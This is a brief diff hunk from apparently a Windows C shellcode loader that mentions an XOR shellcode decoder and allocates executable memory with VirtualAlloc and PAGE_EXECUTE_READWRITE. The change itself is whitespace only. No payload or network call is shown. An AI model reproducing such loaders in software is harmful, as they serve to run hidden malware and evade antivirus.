@@ -20,7 +20,7 @@ Externally defined xorShellcode function:
 */
 
 #include <windows.h>
-int main( int argc, char *argv[] ) {
+int main( int argc, char * argv[] ) {
 
     /* Allocate memory for shellcode */
     LPVOID mem = VirtualAlloc( NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
